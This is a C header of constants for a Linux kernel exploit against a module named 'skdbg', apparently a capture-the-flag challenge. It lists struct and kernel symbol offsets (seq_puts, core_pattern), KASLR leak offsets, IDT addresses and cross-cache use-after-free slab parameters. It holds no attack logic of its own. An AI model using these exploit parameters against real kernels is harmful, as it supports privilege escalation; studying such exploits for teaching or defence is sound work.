#ifndef _SKDBG_DEFS_H
#define _SKDBG_DEFS_H

// Struct offsets were taken from the module's BTF (pahole).  The kernel
// symbol offsets come from System.map

// struct order
#define SKDBG_ORDER_SIZE			0x800
#define SKDBG_ORDER_OFFSET_waiter		0x80
#define SKDBG_ORDER_OFFSET_server_mutex	0x10
#define SKDBG_ORDER_OFFSET_rail_link_next	0x30
#define SKDBG_ORDER_OFFSET_rail_link_prev	0x38
#define SKDBG_ORDER_OFFSET_dishes_next	0x40
#define SKDBG_ORDER_OFFSET_dishes_prev	0x48
#define SKDBG_ORDER_OFFSET_flags		0x60
#define SKDBG_ORDER_OFFSET_state		0x68
#define SKDBG_ORDER_OFFSET_ref		0x70
#define SKDBG_ORDER_OFFSET_dish_offset	0x74
#define SKDBG_ORDER_OFFSET_order_len	0x76

// struct sk_buff
#define SKB_SIZE				0xe8
#define SKB_OFFSET_data				0xd0
#define SKB_OFFSET_head				0xc8
#define SKB_OFFSET_end				0xc0
#define SKB_OFFSET_cb				0x28
#define SKB_OFFSET_len				0x70

/// Other relevant kernel offsets
#define SEQ_PUTS_OFFSET				0x854650UL
#define CORE_PATTERN_OFFSET			0x2abd860UL
#define SEQ_FILE_OFFSET_buf			0x0
#define SEQ_FILE_OFFSET_size			0x8

// struct waiter
#define SKDBG_WAITER_OFFSET_serve	0x0

// struct dish
#define SKDBG_DISH_OFFSET_len			0x2

// struct kitchen
#define SKDBG_KITCHEN_OFFSET_rail		0x8

// struct order constants
#define SKDBG_ORDER_FLAG_closed			1
#define SKDBG_ORDER_STATE_up			1

// Other exploit constants
#define SYSTEM_MEMORY_IN_GB			3
#define GB_VALUE				0x40000000UL
#define MB_VALUE				0x100000UL
#define TRAMPOLINE_PGD_OFFSET			0x9c000UL
#define KERNEL_HEAP_BLOCK_MASK			0xfffffffUL
#define KERNEL_KTEXT_MASK			0xffffffff00000000UL
#define PHYS_BSS_LEAK_OFFSET_KASLR		0x4804000UL
#define IDT_VIRT_ADDR				0xfffffe0000000000UL
#define ASM_EXC_DIVIDE_ERROR_OFFSET		0x940UL

// from linux-7.2 arch/x86/include/asm/desc_defs.h
struct gate_struct {
	unsigned short offset_low;
	unsigned short segment;
	unsigned short bits;
	unsigned short offset_middle;
	unsigned int offset_high;
	unsigned int reserved;
};
typedef struct gate_struct gate_desc;

// order_jar slab parameters from /sys/kernel/slab
#define SKDBG_ORDER_PILE_objs_per_slab		16
#define SKDBG_ORDER_PILE_min_partial		5
#define SKDBG_ORDER_PILE_order			3
#define SKDBG_ORDER_PILE_slab_size		32768
#define SKDBG_ORDER_PILE_object_size		2048

// Cross cache parameters
#define CROSS_CACHE_BASE_ALLOC_ID		0xdead
#define CROSS_CACHE_SLAB_ALLOC_COUNT		10
#define CROSS_CACHE_UAF_SOCKFD_IDX		4

#define ORDER3_PAGE_SIZE			0x8000
#define SKDBG_DISH_LEN			1412 // Chosen to land in kmalloc-2k

#endif /* _SKDBG_DEFS_H */